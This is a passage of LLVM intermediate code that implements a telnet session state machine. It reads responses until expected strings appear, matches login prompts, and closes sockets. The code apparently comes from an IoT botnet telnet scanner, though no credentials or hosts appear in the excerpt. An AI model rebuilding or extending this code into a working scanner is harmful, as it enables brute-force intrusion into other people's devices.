  %1281 = load i32, i32* %2, align 4
  %1282 = sext i32 %1281 to i64
  %1283 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1282
  %1284 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1283, i32 0, i32 0
  %1285 = load i32, i32* %1284, align 16
  %1286 = call i32 @sclose(i32 %1285)
  %1287 = load i32, i32* %2, align 4
  %1288 = sext i32 %1287 to i64
  %1289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1288
  %1290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1289, i32 0, i32 2
  store i8 0, i8* %1290, align 8
  %1291 = load i32, i32* %2, align 4
  %1292 = sext i32 %1291 to i64
  %1293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1292
  %1294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1293, i32 0, i32 3
  store i8 1, i8* %1294, align 1
  br label %1943

; <label>:1295:                                   ; preds = %1267
  %1296 = load i32, i32* %2, align 4
  %1297 = sext i32 %1296 to i64
  %1298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1297
  %1299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1298, i32 0, i32 2
  store i8 7, i8* %1299, align 8
  br label %1300

; <label>:1300:                                   ; preds = %1295
  %1301 = load i32, i32* %2, align 4
  %1302 = sext i32 %1301 to i64
  %1303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1302
  %1304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1303, i32 0, i32 8
  %1305 = load i8*, i8** %1304, align 8
  call void @llvm.memset.p0i8.i64(i8* %1305, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1306:                                   ; preds = %1212
  %1307 = load i32, i32* %2, align 4
  %1308 = sext i32 %1307 to i64
  %1309 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1308
  %1310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1309, i32 0, i32 0
  %1311 = load i32, i32* %1310, align 16
  %1312 = load i32, i32* %2, align 4
  %1313 = sext i32 %1312 to i64
  %1314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1313
  %1315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1314, i32 0, i32 8
  %1316 = load i8*, i8** %1315, align 8
  %1317 = load i32, i32* %2, align 4
  %1318 = sext i32 %1317 to i64
  %1319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1318
  %1320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1319, i32 0, i32 7
  %1321 = load i16, i16* %1320, align 16
  %1322 = zext i16 %1321 to i32
  %1323 = call i32 @readUntil(i32 %1311, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1316, i32 1024, i32 %1322)
  %1324 = icmp ne i32 %1323, 0
  br i1 %1324, label %1325, label %1400

; <label>:1325:                                   ; preds = %1306
  %1326 = load i32, i32* %2, align 4
  %1327 = sext i32 %1326 to i64
  %1328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1327
  %1329 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1328, i32 0, i32 6
  store i32 0, i32* %1329, align 4
  %1330 = load i32, i32* %2, align 4
  %1331 = sext i32 %1330 to i64
  %1332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1331
  %1333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1332, i32 0, i32 7
  store i16 0, i16* %1333, align 16
  %1334 = load i32, i32* %2, align 4
  %1335 = sext i32 %1334 to i64
  %1336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1335
  %1337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1336, i32 0, i32 8
  %1338 = load i8*, i8** %1337, align 8
  %1339 = call i8* @strstr(i8* %1338, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1340 = icmp ne i8* %1339, null
  br i1 %1340, label %1341, label %1361

; <label>:1341:                                   ; preds = %1325
  %1342 = load i32, i32* %2, align 4
  %1343 = sext i32 %1342 to i64
  %1344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1343
  %1345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1344, i32 0, i32 8
  %1346 = load i8*, i8** %1345, align 8
  call void @llvm.memset.p0i8.i64(i8* %1346, i8 0, i64 1024, i32 1, i1 false)
  %1347 = load i32, i32* %2, align 4
  %1348 = sext i32 %1347 to i64
  %1349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1348
  %1350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1349, i32 0, i32 0
  %1351 = load i32, i32* %1350, align 16
  %1352 = call i32 @sclose(i32 %1351)
  %1353 = load i32, i32* %2, align 4
  %1354 = sext i32 %1353 to i64
  %1355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1354
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1355, i32 0, i32 2
  store i8 0, i8* %1356, align 8
  %1357 = load i32, i32* %2, align 4
  %1358 = sext i32 %1357 to i64
  %1359 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1358
  %1360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1359, i32 0, i32 3
  store i8 0, i8* %1360, align 1
  br label %1943

; <label>:1361:                                   ; preds = %1325
  %1362 = load i32, i32* %2, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1363
  %1365 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1364, i32 0, i32 8
  %1366 = load i8*, i8** %1365, align 8
  %1367 = call i32 @matchPrompt(i8* %1366)
  %1368 = icmp ne i32 %1367, 0
  br i1 %1368, label %1389, label %1369

; <label>:1369:                                   ; preds = %1361
  %1370 = load i32, i32* %2, align 4
  %1371 = sext i32 %1370 to i64
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 8
  %1374 = load i8*, i8** %1373, align 8
  call void @llvm.memset.p0i8.i64(i8* %1374, i8 0, i64 1024, i32 1, i1 false)
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 0
  %1379 = load i32, i32* %1378, align 16
  %1380 = call i32 @sclose(i32 %1379)
  %1381 = load i32, i32* %2, align 4
  %1382 = sext i32 %1381 to i64
  %1383 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1382
  %1384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1383, i32 0, i32 2
  store i8 0, i8* %1384, align 8
  %1385 = load i32, i32* %2, align 4
  %1386 = sext i32 %1385 to i64
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1386
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1387, i32 0, i32 3
  store i8 1, i8* %1388, align 1
  br label %1943

; <label>:1389:                                   ; preds = %1361
  %1390 = load i32, i32* %2, align 4
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1391
  %1393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1392, i32 0, i32 2
  store i8 7, i8* %1393, align 8
  br label %1394

; <label>:1394:                                   ; preds = %1389
  %1395 = load i32, i32* %2, align 4
  %1396 = sext i32 %1395 to i64
  %1397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1396
  %1398 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1397, i32 0, i32 8
  %1399 = load i8*, i8** %1398, align 8
  call void @llvm.memset.p0i8.i64(i8* %1399, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1400:                                   ; preds = %1306
  %1401 = load i32, i32* %2, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1402
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1403, i32 0, i32 0
  %1405 = load i32, i32* %1404, align 16
  %1406 = load i32, i32* %2, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1407
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1408, i32 0, i32 8
  %1410 = load i8*, i8** %1409, align 8
  %1411 = load i32, i32* %2, align 4
  %1412 = sext i32 %1411 to i64
  %1413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1412
  %1414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1413, i32 0, i32 7
  %1415 = load i16, i16* %1414, align 16
  %1416 = zext i16 %1415 to i32
  %1417 = call i32 @readUntil(i32 %1405, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1410, i32 1024, i32 %1416)
  %1418 = icmp ne i32 %1417, 0
  br i1 %1418, label %1419, label %1494

; <label>:1419:                                   ; preds = %1400
  %1420 = load i32, i32* %2, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1421
  %1423 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1422, i32 0, i32 6
  store i32 0, i32* %1423, align 4
  %1424 = load i32, i32* %2, align 4
  %1425 = sext i32 %1424 to i64
  %1426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1425
  %1427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1426, i32 0, i32 7
  store i16 0, i16* %1427, align 16
  %1428 = load i32, i32* %2, align 4
  %1429 = sext i32 %1428 to i64
  %1430 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1429
  %1431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1430, i32 0, i32 8
  %1432 = load i8*, i8** %1431, align 8
  %1433 = call i8* @strstr(i8* %1432, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1434 = icmp ne i8* %1433, null
  br i1 %1434, label %1435, label %1455

; <label>:1435:                                   ; preds = %1419
  %1436 = load i32, i32* %2, align 4
  %1437 = sext i32 %1436 to i64
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 8
  %1440 = load i8*, i8** %1439, align 8
  call void @llvm.memset.p0i8.i64(i8* %1440, i8 0, i64 1024, i32 1, i1 false)
  %1441 = load i32, i32* %2, align 4
  %1442 = sext i32 %1441 to i64
  %1443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1442
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1443, i32 0, i32 0
  %1445 = load i32, i32* %1444, align 16
  %1446 = call i32 @sclose(i32 %1445)
  %1447 = load i32, i32* %2, align 4
  %1448 = sext i32 %1447 to i64
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1448
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1449, i32 0, i32 2
  store i8 0, i8* %1450, align 8
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 3
  store i8 0, i8* %1454, align 1
  br label %1943

; <label>:1455:                                   ; preds = %1419
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 8
  %1460 = load i8*, i8** %1459, align 8
  %1461 = call i32 @matchPrompt(i8* %1460)
  %1462 = icmp ne i32 %1461, 0
  br i1 %1462, label %1483, label %1463

; <label>:1463:                                   ; preds = %1455
  %1464 = load i32, i32* %2, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1465
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1466, i32 0, i32 8
  %1468 = load i8*, i8** %1467, align 8
  call void @llvm.memset.p0i8.i64(i8* %1468, i8 0, i64 1024, i32 1, i1 false)
  %1469 = load i32, i32* %2, align 4
  %1470 = sext i32 %1469 to i64
  %1471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1470
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1471, i32 0, i32 0
  %1473 = load i32, i32* %1472, align 16
  %1474 = call i32 @sclose(i32 %1473)
  %1475 = load i32, i32* %2, align 4
  %1476 = sext i32 %1475 to i64
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1476
  %1478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1477, i32 0, i32 2
  store i8 0, i8* %1478, align 8
  %1479 = load i32, i32* %2, align 4
  %1480 = sext i32 %1479 to i64
  %1481 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1480
  %1482 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1481, i32 0, i32 3
  store i8 1, i8* %1482, align 1
  br label %1943

; <label>:1483:                                   ; preds = %1455
  %1484 = load i32, i32* %2, align 4
  %1485 = sext i32 %1484 to i64
  %1486 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1485
  %1487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1486, i32 0, i32 2
  store i8 7, i8* %1487, align 8
  br label %1488

; <label>:1488:                                   ; preds = %1483
  %1489 = load i32, i32* %2, align 4
  %1490 = sext i32 %1489 to i64
  %1491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1490
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1491, i32 0, i32 8
  %1493 = load i8*, i8** %1492, align 8
  call void @llvm.memset.p0i8.i64(i8* %1493, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1494:                                   ; preds = %1400
  %1495 = load i32, i32* %2, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1496
  %1498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1497, i32 0, i32 0
  %1499 = load i32, i32* %1498, align 16
  %1500 = load i32, i32* %2, align 4
  %1501 = sext i32 %1500 to i64
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1501
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1502, i32 0, i32 8
  %1504 = load i8*, i8** %1503, align 8
  %1505 = load i32, i32* %2, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 7
  %1509 = load i16, i16* %1508, align 16
  %1510 = zext i16 %1509 to i32
  %1511 = call i32 @readUntil(i32 %1499, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1504, i32 1024, i32 %1510)
  %1512 = icmp ne i32 %1511, 0
  br i1 %1512, label %1513, label %1588

; <label>:1513:                                   ; preds = %1494
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 6
  store i32 0, i32* %1517, align 4
  %1518 = load i32, i32* %2, align 4
  %1519 = sext i32 %1518 to i64
  %1520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1519
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1520, i32 0, i32 7
  store i16 0, i16* %1521, align 16
  %1522 = load i32, i32* %2, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1523
  %1525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1524, i32 0, i32 8
  %1526 = load i8*, i8** %1525, align 8
  %1527 = call i8* @strstr(i8* %1526, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1528 = icmp ne i8* %1527, null
  br i1 %1528, label %1529, label %1549

; <label>:1529:                                   ; preds = %1513
  %1530 = load i32, i32* %2, align 4
  %1531 = sext i32 %1530 to i64
  %1532 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1531
  %1533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1532, i32 0, i32 8
  %1534 = load i8*, i8** %1533, align 8
  call void @llvm.memset.p0i8.i64(i8* %1534, i8 0, i64 1024, i32 1, i1 false)
  %1535 = load i32, i32* %2, align 4
  %1536 = sext i32 %1535 to i64
  %1537 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1536
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1537, i32 0, i32 0
  %1539 = load i32, i32* %1538, align 16
  %1540 = call i32 @sclose(i32 %1539)
  %1541 = load i32, i32* %2, align 4
  %1542 = sext i32 %1541 to i64
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1542
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1543, i32 0, i32 2
  store i8 0, i8* %1544, align 8
  %1545 = load i32, i32* %2, align 4
  %1546 = sext i32 %1545 to i64
  %1547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1546
  %1548 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1547, i32 0, i32 3
  store i8 0, i8* %1548, align 1
  br label %1943

; <label>:1549:                                   ; preds = %1513
  %1550 = load i32, i32* %2, align 4
  %1551 = sext i32 %1550 to i64
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1551
  %1553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1552, i32 0, i32 8
  %1554 = load i8*, i8** %1553, align 8
  %1555 = call i32 @matchPrompt(i8* %1554)
  %1556 = icmp ne i32 %1555, 0
  br i1 %1556, label %1577, label %1557

; <label>:1557:                                   ; preds = %1549
  %1558 = load i32, i32* %2, align 4
  %1559 = sext i32 %1558 to i64
  %1560 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1559
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1560, i32 0, i32 8
  %1562 = load i8*, i8** %1561, align 8
  call void @llvm.memset.p0i8.i64(i8* %1562, i8 0, i64 1024, i32 1, i1 false)
  %1563 = load i32, i32* %2, align 4
  %1564 = sext i32 %1563 to i64
  %1565 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1564
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1565, i32 0, i32 0
  %1567 = load i32, i32* %1566, align 16
  %1568 = call i32 @sclose(i32 %1567)
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 2
  store i8 0, i8* %1572, align 8
  %1573 = load i32, i32* %2, align 4
  %1574 = sext i32 %1573 to i64
  %1575 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1574
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1575, i32 0, i32 3
  store i8 1, i8* %1576, align 1
  br label %1943

; <label>:1577:                                   ; preds = %1549
  %1578 = load i32, i32* %2, align 4
  %1579 = sext i32 %1578 to i64
  %1580 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1579
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1580, i32 0, i32 2
  store i8 7, i8* %1581, align 8
  br label %1582

; <label>:1582:                                   ; preds = %1577
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 8
  %1587 = load i8*, i8** %1586, align 8
  call void @llvm.memset.p0i8.i64(i8* %1587, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1588:                                   ; preds = %1494
  %1589 = load i32, i32* %2, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 0
  %1593 = load i32, i32* %1592, align 16
  %1594 = load i32, i32* %2, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1595
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1596, i32 0, i32 8
  %1598 = load i8*, i8** %1597, align 8
  %1599 = load i32, i32* %2, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1600
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1601, i32 0, i32 7
  %1603 = load i16, i16* %1602, align 16
  %1604 = zext i16 %1603 to i32
  %1605 = call i32 @readUntil(i32 %1593, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1598, i32 1024, i32 %1604)
  %1606 = icmp ne i32 %1605, 0
  br i1 %1606, label %1607, label %1682

; <label>:1607:                                   ; preds = %1588
  %1608 = load i32, i32* %2, align 4
  %1609 = sext i32 %1608 to i64
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1609
  %1611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1610, i32 0, i32 6
  store i32 0, i32* %1611, align 4
  %1612 = load i32, i32* %2, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1613
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1614, i32 0, i32 7
  store i16 0, i16* %1615, align 16
  %1616 = load i32, i32* %2, align 4
  %1617 = sext i32 %1616 to i64
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1617
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1618, i32 0, i32 8
  %1620 = load i8*, i8** %1619, align 8
  %1621 = call i8* @strstr(i8* %1620, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1622 = icmp ne i8* %1621, null
  br i1 %1622, label %1623, label %1643

; <label>:1623:                                   ; preds = %1607
  %1624 = load i32, i32* %2, align 4
  %1625 = sext i32 %1624 to i64
  %1626 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1625
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1626, i32 0, i32 8
  %1628 = load i8*, i8** %1627, align 8
  call void @llvm.memset.p0i8.i64(i8* %1628, i8 0, i64 1024, i32 1, i1 false)
  %1629 = load i32, i32* %2, align 4
  %1630 = sext i32 %1629 to i64
  %1631 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1630
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1631, i32 0, i32 0
  %1633 = load i32, i32* %1632, align 16
  %1634 = call i32 @sclose(i32 %1633)
  %1635 = load i32, i32* %2, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 2
  store i8 0, i8* %1638, align 8
  %1639 = load i32, i32* %2, align 4
  %1640 = sext i32 %1639 to i64
  %1641 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1640
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1641, i32 0, i32 3
  store i8 0, i8* %1642, align 1
  br label %1943

; <label>:1643:                                   ; preds = %1607
  %1644 = load i32, i32* %2, align 4
  %1645 = sext i32 %1644 to i64
  %1646 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1645
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1646, i32 0, i32 8
  %1648 = load i8*, i8** %1647, align 8
  %1649 = call i32 @matchPrompt(i8* %1648)
  %1650 = icmp ne i32 %1649, 0
  br i1 %1650, label %1671, label %1651

; <label>:1651:                                   ; preds = %1643
  %1652 = load i32, i32* %2, align 4
  %1653 = sext i32 %1652 to i64
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1653
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1654, i32 0, i32 8
  %1656 = load i8*, i8** %1655, align 8
  call void @llvm.memset.p0i8.i64(i8* %1656, i8 0, i64 1024, i32 1, i1 false)
  %1657 = load i32, i32* %2, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 0
  %1661 = load i32, i32* %1660, align 16
  %1662 = call i32 @sclose(i32 %1661)
  %1663 = load i32, i32* %2, align 4
  %1664 = sext i32 %1663 to i64
  %1665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1664
  %1666 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1665, i32 0, i32 2
  store i8 0, i8* %1666, align 8
  %1667 = load i32, i32* %2, align 4
  %1668 = sext i32 %1667 to i64
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1668
  %1670 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1669, i32 0, i32 3
  store i8 1, i8* %1670, align 1
  br label %1943

; <label>:1671:                                   ; preds = %1643
  %1672 = load i32, i32* %2, align 4
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1673
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1674, i32 0, i32 2
  store i8 7, i8* %1675, align 8
  br label %1676

; <label>:1676:                                   ; preds = %1671
  %1677 = load i32, i32* %2, align 4
  %1678 = sext i32 %1677 to i64
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1678
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1679, i32 0, i32 8
  %1681 = load i8*, i8** %1680, align 8
  call void @llvm.memset.p0i8.i64(i8* %1681, i8 0, i64 1024, i32 1, i1 false)
  br label %1943

; <label>:1682:                                   ; preds = %1588
  %1683 = load i32, i32* %2, align 4
  %1684 = sext i32 %1683 to i64
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1684
  %1686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1685, i32 0, i32 0
  %1687 = load i32, i32* %1686, align 16
  %1688 = load i32, i32* %2, align 4
  %1689 = sext i32 %1688 to i64
  %1690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1689
  %1691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1690, i32 0, i32 8
  %1692 = load i8*, i8** %1691, align 8
  %1693 = load i32, i32* %2, align 4
  %1694 = sext i32 %1693 to i64
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1694
  %1696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1695, i32 0, i32 7
  %1697 = load i16, i16* %1696, align 16
  %1698 = zext i16 %1697 to i32
  %1699 = call i32 @readUntil(i32 %1687, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1692, i32 1024, i32 %1698)
  %1700 = icmp ne i32 %1699, 0
  br i1 %1700, label %1701, label %1776

; <label>:1701:                                   ; preds = %1682
  %1702 = load i32, i32* %2, align 4
  %1703 = sext i32 %1702 to i64
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1703
  %1705 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1704, i32 0, i32 6
  store i32 0, i32* %1705, align 4
  %1706 = load i32, i32* %2, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1707
